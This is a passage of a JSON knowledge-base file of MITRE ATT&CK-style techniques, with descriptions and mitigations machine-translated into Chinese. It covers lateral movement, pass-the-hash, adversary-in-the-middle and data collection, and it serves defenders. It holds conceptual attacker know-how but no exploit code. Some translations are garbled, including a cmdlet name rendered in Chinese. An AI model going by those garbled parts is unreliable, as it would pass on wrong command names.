                            "content": "在Windows 10上，启用减少攻击表面（ASR）规则以阻止未签名/不受信任的可执行文件（如.exe、.dll或.scr）从USB可移动驱动器运行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不需要，请禁用“自动运行”。如果业务运营不需要可移动媒体，则在组织策略级别上禁止或限制可移动媒体。"
                        }
                    ]
                ]
            },
            {
                "id": "M1034",
                "name": "限制硬件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制在网络中使用USB设备和可移动媒体。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1072",
        "name": "Software Deployment Tools",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            },
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以访问并使用安装在企业网络中的第三方软件套件，如管理、监控和部署系统，在网络中横向移动。第三方应用程序和软件部署系统可以在网络环境中用于管理目的（例如，SCCM、HBSS、Altiris等）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对第三方网络范围或企业范围软件系统的访问可以使对手能够在连接到这样的系统的所有系统上进行远程代码执行。访问可以用于横向移动到其他系统、收集信息或造成特定影响，例如擦除所有端点上的硬盘驱动器。网络基础设施也可能具有同样可能被对手滥用的管理工具。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "此操作所需的权限因系统配置而异；本地凭证可能足以直接访问第三方系统，或者可能需要特定的域凭证。但是，系统可能需要管理帐户才能登录或执行其预期目的。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用组策略确保关键网络系统的正确系统和访问隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1033",
                "name": "限制软件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制使用安装在企业网络中的第三方软件套件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用多因素身份验证，确保关键网络系统的正确系统和访问隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用防火墙确保关键网络系统的适当系统隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "验证可用于访问部署系统的帐户凭据是唯一的，并且未在整个企业网络中使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "仅向数量有限的授权管理员授予对应用程序部署系统的访问权限。"
                        }
                    ]
                ]
            },
            {
                "id": "M1029",
                "name": "远程数据存储",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果应用程序部署系统可以配置为仅部署已签名的二进制文件，请确保受信任的签名证书不与应用程序部署体系位于同一位置，而是位于无法远程访问或远程访问受到严格控制的系统上。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期对部署系统进行修补，以防止通过特权升级漏洞进行潜在的远程访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保第三方提供商用于访问这些系统的任何帐户都可以追溯到第三方，并且不会在整个网络中使用，也不会被同一环境中的其他第三方供应商使用。确保对提供给这些系统的帐户进行定期审查，以验证持续的业务需求，并确保有治理来跟踪不再需要的访问的取消提供。通过使用帐户权限分离，确保关键网络系统的正确系统和访问隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对部署系统的使用有严格的审批政策。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1080",
        "name": "Taint Shared Content",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以通过将内容添加到共享存储位置（如网络驱动器或内部代码存储库）来将有效载荷传递到远程系统。存储在网络驱动器或其他共享位置的内容可能会因在其他有效文件中添加恶意程序、脚本或利用代码而受到污染。一旦用户打开共享的受污染内容，就可以执行恶意部分，在远程系统上运行对手的代码。敌人可能会使用受污染的共享内容进行横向移动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "目录共享枢轴是该技术的变体，当用户访问共享网络目录时，它使用其他几种技术来传播恶意软件。它使用目录的快捷方式修改。使用伪装看起来像真实目录的LNK文件，这些文件通过隐藏文件和目录隐藏。恶意的。基于LNK的目录有一个嵌入式命令，该命令执行目录中隐藏的恶意软件文件，然后打开真正的预期目录，以便用户的预期操作仍然发生。当与频繁使用的网络目录一起使用时，该技术可能会导致频繁的再次感染和对系统的广泛访问，并可能导致对新的和更高特权的帐户的广泛访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过将其代码附加或预附加到共享网络目录上的健康二进制文件，敌人也可能通过二进制感染危害共享网络目录。恶意软件可以修改健康二进制文件的原始入口点（OEP），以确保它在合法代码之前执行。当远程系统执行新感染的文件时，感染可能会继续通过该文件传播。这些感染可能针对二进制和非二进制格式，这些格式的扩展名包括但不限于。EXE。DLL。SCR。BAT和/或。VBS。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1049",
                "name": "防病毒/反恶意软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防病毒可以用于自动隔离可疑文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "识别可能用于污染内容或由此产生的潜在恶意软件，并在适当的情况下使用应用程序控制工具（如AppLocker或软件限制策略）审核和/或阻止未知程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用检测或缓解利用中使用的常见功能的实用程序，如Microsoft增强型缓解体验工具包（EMET）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过最小化具有写访问权限的用户来保护共享文件夹。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1550",
        "name": "Use Alternate Authentication Material",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [
            {
                "id": "T1550.001",
                "name": "Application Access Token"
            },
            {
                "id": "T1550.002",
                "name": "Pass the Hash"
            },
            {
                "id": "T1550.003",
                "name": "Pass the Ticket"
            },
            {
                "id": "T1550.004",
                "name": "Web Session Cookie"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用替代的身份验证材料，如密码哈希、Kerberos票证和应用程序访问令牌，以便在环境中横向移动并绕过正常的系统访问控制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "身份验证过程通常需要有效身份（如用户名）以及一个或多个身份验证因素（如密码、密码、物理智能卡、令牌生成器等）。在用户或应用程序通过提供有效身份和所需身份验证因素成功进行身份验证后，系统会合法生成替代身份验证材料。在身份创建过程中也可以生成替代的认证材料。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "缓存备用身份验证材料允许系统验证身份是否已成功进行身份验证，而无需要求用户重新输入身份验证因素。因为备用身份验证必须由系统维护——无论是在内存中还是在磁盘上——它可能有通过凭据访问技术被盗的风险。通过窃取备用身份验证材料，对手能够绕过系统访问控制，在不知道明文密码或任何其他身份验证因素的情况下对系统进行身份验证。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制系统之间的凭证重叠，以防止凭证泄露造成的损害，并降低对手在系统之间进行横向移动的能力。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "执行最低特权原则。不允许域用户位于多个系统上的本地管理员组中。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1557",
        "name": "Adversary-in-the-Middle",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1557.001",
                "name": "LLMNR/NBT-NS Poisoning and SMB Relay"
            },
            {
                "id": "T1557.002",
                "name": "ARP Cache Poisoning"
            },
            {
                "id": "T1557.003",
                "name": "DHCP Spoofing"
            }
        ],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图使用中间对手（AiTM）技术将自己定位在两个或多个联网设备之间，以支持后续行为，如网络嗅探、传输数据操纵或重放攻击（利用凭据访问）。通过滥用可以确定网络流量的常见网络协议的特征（例如ARP、DNS、LLMNR等），对手可能会迫使设备通过对手控制的系统进行通信，从而收集信息或执行额外的操作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，对手可能会操纵受害者的DNS设置，以启用其他恶意活动，例如阻止/重定向用户访问合法网站和/或推送其他恶意软件。对手也可能操纵DNS并利用其地位来拦截用户凭据和会话cookie。降级攻击也可用于建立AiTM位置，例如通过协商不太安全、不推荐使用或较弱版本的通信协议（SSL/TLS）或加密算法。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手也可以利用AiTM位置来尝试监控和/或修改流量，例如在传输数据操作中。敌人可以设置类似于AiTM的位置，以防止流量流向适当的目的地，可能会损害防御和/或支持网络拒绝服务。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用可能用于拦截网络流量的遗留网络协议（如果适用），尤其是环境中不需要的协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有有线和/或无线通信都经过适当加密。使用Kerberos等身份验证协议的最佳实践，并确保可能包含凭据的web流量受到SSL/TLS的保护。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络设备和基于主机的安全软件来阻止环境中不必要的网络流量，例如可用于AiTM条件的遗留协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对可用于重塑流量或以其他方式产生AiTM条件的网络基础设施和资源的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以识别指示AiTM活动的流量模式的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "网络分段可用于隔离不需要广泛网络访问的基础设施组件。这可以减轻，或者至少减轻AiTM活动的范围。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "训练用户对证书错误持怀疑态度。对手可能会使用自己的证书试图拦截HTTPS流量。当应用程序的证书与主机期望的证书不匹配时，可能会出现证书错误。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1560",
        "name": "Archive Collected Data",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1560.001",
                "name": "Archive via Utility"
            },
            {
                "id": "T1560.002",
                "name": "Archive via Library"
            },
            {
                "id": "T1560.003",
                "name": "Archive via Custom Method"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以压缩和/或加密在泄露之前收集的数据。压缩数据有助于混淆收集的数据，并最大限度地减少通过网络发送的数据量。加密可以用来隐藏被泄露的信息，使其无法被检测到，或者使泄露在辩护人检查时不那么显眼。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "压缩和加密都是在exfiltering之前完成的，可以使用实用程序、第三方库或自定义方法执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以执行系统扫描来识别未经授权的归档实用程序。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1123",
        "name": "Audio Capture",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以利用计算机的外围设备（如麦克风和网络摄像头）或应用程序（如语音和视频通话服务）来捕捉音频记录，以监听敏感对话以收集信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "恶意软件或脚本可用于通过操作系统或应用程序提供的可用API与设备交互以捕获音频。音频文件可以写入磁盘，稍后再进行过滤。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1119",
        "name": "Automated Collection",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "一旦在系统或网络中建立，对手就可以使用自动化技术来收集内部数据。执行此技术的方法可以包括使用命令和脚本解释器以特定的时间间隔搜索和复制符合设置标准（如文件类型、位置或名称）的信息。在基于云的环境中，对手还可以使用云API、命令行接口或提取、转换和加载（ETL）服务来自动收集数据。此功能也可以内置到远程访问工具中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "该技术可以结合使用其他技术，例如文件和目录发现和横向工具传输来识别和移动文件，以及云服务面板和云存储对象发现来识别云环境中的资源。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "加密和系统外存储敏感信息可能是减少文件收集的一种方式，但如果入侵持续很长一段时间，并且对手能够通过其他方式发现和访问数据，则可能无法阻止对手获取信息。应在某些加密文档上使用强密码，以防止通过Brute Force技术进行离线破解。"
                        }
                    ]
                ]
            },
            {
                "id": "M1029",
                "name": "远程数据存储",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "加密和系统外存储敏感信息可能是减少文件收集的一种方式，但如果入侵持续很长一段时间，并且对手能够通过其他方式发现和访问数据，则可能无法阻止对手获取信息。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1185",
        "name": "Browser Session Hijacking",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "作为各种浏览器会话劫持技术的一部分，攻击者可能会利用浏览器软件中的安全漏洞和固有功能来更改内容、修改用户行为和拦截信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "一个具体的例子是，对手将软件注入浏览器，使其能够继承用户的cookie、HTTP会话和SSL客户端证书，然后使用浏览器进入经过身份验证的内联网。执行基于浏览器的行为（如数据透视）可能需要特定的进程权限，如"
                },
                {
                    "type": "code",
                    "content": "SeDebugPrivilege"
                },
                {
                    "type": "text",
                    "content": "和/或高完整性/管理员权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "另一个例子涉及通过设置重定向网络流量的代理，将浏览器流量从对手的浏览器转移到用户的浏览器。这不会以任何方式改变用户的流量，并且浏览器一关闭，代理连接就可以断开。对手假设将代理注入哪个浏览器进程的安全上下文。浏览器通常会为打开的每个选项卡创建一个新的进程，并相应地分离权限和证书。有了这些权限，对手可能会浏览到intranet上的任何资源，如Sharepoint或webmail，这些资源可以通过浏览器访问，并且浏览器具有足够的权限。浏览器透视也可以绕过双因素身份验证提供的安全性。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "由于浏览器数据透视需要一个高完整性的启动过程，因此限制用户权限和解决权限提升和绕过用户帐户控制的机会可以限制使用此技术。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期关闭所有浏览器会话，并在不再需要时关闭这些会话。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1115",
        "name": "Clipboard Data",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会从在应用程序内或应用程序之间复制信息的用户那里收集存储在剪贴板中的数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，在Windows上，对手可以使用"
                },
                {
                    "type": "code",
                    "content": "clip.exe"
                },
                {
                    "type": "text",
                    "content": "或"
                },
                {
                    "type": "code",
                    "content": "获取剪贴板"
                },
                {
                    "type": "text",
                    "content": "访问剪贴板数据。此外，对手可能会进行监控，然后用用户的数据替换用户的剪贴板（例如，传输数据操作）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "macOS和Linux也有命令，如"
                },
                {
                    "type": "code",
                    "content": "pbpaste"
                },
                {
                    "type": "text",
                    "content": "，以获取剪贴板内容。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1530",
        "name": "Data from Cloud Storage",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会访问云存储中的数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "许多IaaS提供商提供在线数据对象存储解决方案，如Amazon S3、Azure storage和Google Cloud storage。类似地，Office 365和Google Workspace等SaaS企业平台通过OneDrive和Google Drive等服务向用户提供基于云的文档存储，而Slack、Confluence、Salesforce和Dropbox等SaaS应用程序提供商可以将云存储解决方案作为其平台的外围或主要用例提供。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，与基于IaaS-的云存储一样，不存在与存储对象交互的总体应用程序（如SQL或Elasticsearch）：相反，通过cloud API直接检索这些解决方案中的数据。在SaaS应用程序中，对手可能能够直接从API或后端云存储对象收集这些数据，而不是通过其前端应用程序或接口（即信息存储库中的数据）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会从这些云存储解决方案中收集敏感数据。提供商通常提供安全指南来帮助最终用户配置系统，尽管错误配置是一个常见问题。在许多事件中，云存储受到了不适当的保护，通常是无意中允许未经身份验证的用户进行公共访问，所有用户的访问范围过广，甚至不需要基本的用户权限就可以访问身份访问管理系统控制范围外的任何匿名人员。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "这种公开访问可能会暴露各种类型的敏感数据，如信用卡、个人身份信息或医疗记录。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可能从源存储库、日志或其他方式获取并滥用泄露的凭据，以此来访问云存储对象。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "经常检查云存储上的权限，以确保设置了适当的权限来拒绝对资源的开放或非特权访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "加密云存储中静态存储的数据。大多数提供商都可以轮换托管加密密钥。至少，确保针对存储漏洞的事件响应计划包括轮换密钥和测试对客户端应用程序的影响。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "云服务提供商在访问云资源时支持基于IP的限制。考虑将IP allowlisting与用户帐户管理一起使用，以确保数据访问不仅限于有效用户，而且仅限于预期的IP范围，从而减少使用被盗凭据访问数据的情况。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑使用多因素身份验证来限制对资源和云存储API的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对存储系统和对象使用访问控制列表。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置访问云存储的用户权限组和角色。实施严格的身份和访问管理（IAM）控制，以防止访问存储解决方案（需要访问的应用程序、用户和服务除外）。确保颁发临时访问令牌，而不是永久凭据，尤其是在将访问权限授予内部安全边界之外的实体时。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1602",
        "name": "Data from Configuration Repository",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1602.001",
                "name": "SNMP (MIB Dump)"
            },
            {
                "id": "T1602.002",
                "name": "Network Device Configuration Dump"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会从配置存储库中收集与托管设备相关的数据。管理系统使用配置存储库来配置、管理和控制远程系统上的数据。配置存储库还可以促进设备的远程访问和管理。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会以这些存储库为目标，以收集大量敏感的系统管理数据。来自配置存储库的数据可能会被各种协议和软件公开，并且可以存储各种各样的数据，其中大部分数据可能与对手的发现目标一致。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将SNMPv3配置为使用可用的最高安全级别（authPriv）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用扩展的ACL以阻止受信任网络之外的未经授权的协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置入侵防护设备以检测来自未经授权来源的SNMP查询和命令。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在单独的管理网络上隔离SNMP流量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "允许列出MIB对象并实现SNMP视图。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "保持系统映像和软件的更新并迁移到SNMPv3。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1213",
        "name": "Data from Information Repositories",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1213.001",
                "name": "Confluence"
            },
            {
                "id": "T1213.002",
                "name": "Sharepoint"
            },
            {
                "id": "T1213.003",
                "name": "Code Repositories"
            }
        ],
        "version": "3.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会利用信息库来挖掘有价值的信息。信息库是允许存储信息的工具，通常是为了促进用户之间的协作或信息共享，并且可以存储各种各样的数据，这些数据可以帮助对手实现进一步的目标，或者直接访问目标信息。对手也可能滥用外部共享功能与组织外的收件人共享敏感文档。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "以下是可能对对手具有潜在价值的示例信息的简要列表，也可以在信息库中找到："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "政策、程序和标准"
                },
                {
                    "type": "list",
                    "content": "物理/逻辑网络图"
                },
                {
                    "type": "list",
                    "content": "系统架构图"
                },
                {
                    "type": "list",
                    "content": "技术系统文件"
                },
                {
                    "type": "list",
                    "content": "测试/开发证书"
                },
                {
                    "type": "list",
                    "content": "工作/项目时间表"
                },
                {
                    "type": "list",
                    "content": "源代码片段"
                },
                {
                    "type": "list",
                    "content": "网络共享和其他内部资源的链接"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "存储在存储库中的信息可能因具体实例或环境而异。特定的常见信息存储库包括基于web的平台，如Sharepoint和Confluence，特定的服务，如代码存储库、IaaS数据库、企业数据库，以及其他存储基础设施，如SQL Server。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑定期审查关键和敏感存储库的帐户和权限。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "执行最低特权原则。考虑实现包括身份验证和授权的访问控制机制。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "制定和发布定义存储在存储库中的可接受信息的策略。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1005",
        "name": "Data from Local System",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会搜索本地系统源，如文件系统和配置文件或本地数据库，以在Exfiltered之前找到感兴趣的文件和敏感数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以使用命令和脚本解释器（如cmd）以及网络设备CLI（具有与文件系统交互以收集信息的功能）来执行此操作。敌人也可以在本地系统上使用自动收集。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1057",
                "name": "数据丢失预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止数据丢失可以限制对敏感数据的访问，并检测未加密的敏感数据。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1039",
        "name": "Data from Network Shared Drive",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会在他们入侵的计算机上搜索网络共享，以找到感兴趣的文件。可以通过共享网络驱动器（主机共享目录、网络文件服务器等）从远程系统收集敏感数据，这些驱动器在Exfiltering之前可以从当前系统访问。交互式命令外壳可能正在使用中，cmd内的通用功能可用于收集信息。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1025",
        "name": "Data from Removable Media",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会在他们入侵的计算机上搜索连接的可移动媒体，以查找感兴趣的文件。在Exfiltering之前，可以从连接到受损系统的任何可移动介质（光盘驱动器、USB存储器等）中收集敏感数据。交互式命令外壳可能正在使用中，cmd内的通用功能可用于收集信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "一些对手也可能在可移动媒体上使用自动收集。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1057",
                "name": "数据丢失预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止数据丢失可以限制对敏感数据的访问，并检测未加密的敏感数据。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1074",
        "name": "Data Staged",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1074.001",
                "name": "Local Data Staging"
            },
            {
                "id": "T1074.002",
                "name": "Remote Data Staging"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会在Exfiltered之前将收集的数据存放在中心位置或目录中。数据可以保存在单独的文件中，也可以通过归档收集的数据等技术组合成一个文件。可以使用交互式命令外壳，cmd和bash中的通用功能可以用于将数据复制到暂存位置。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在云环境中，对手可能会在过滤前将数据存储在特定实例或虚拟机中。对手可以创建云实例并在该实例中存储数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以选择在Exfiltering之前将来自受害者网络的数据存放在集中位置，以最大限度地减少与其C2服务器的连接数量，并更好地躲避检测。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1114",
        "name": "Email Collection",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1114.001",
                "name": "Local Email Collection"
            },
            {
                "id": "T1114.002",
                "name": "Remote Email Collection"
            },
            {
                "id": "T1114.003",
                "name": "Email Forwarding Rule"
            }
        ],
        "version": "2.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能以用户电子邮件为目标来收集敏感信息。电子邮件中可能包含对对手有价值的敏感数据，包括商业机密或个人信息。敌人可以从邮件服务器或客户端收集或转发电子邮件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "企业电子邮件解决方案具有监控机制，其中可能包括定期审核自动转发规则的能力。"
                        }
                    ],
                    [
                        {
                            "type": "text",
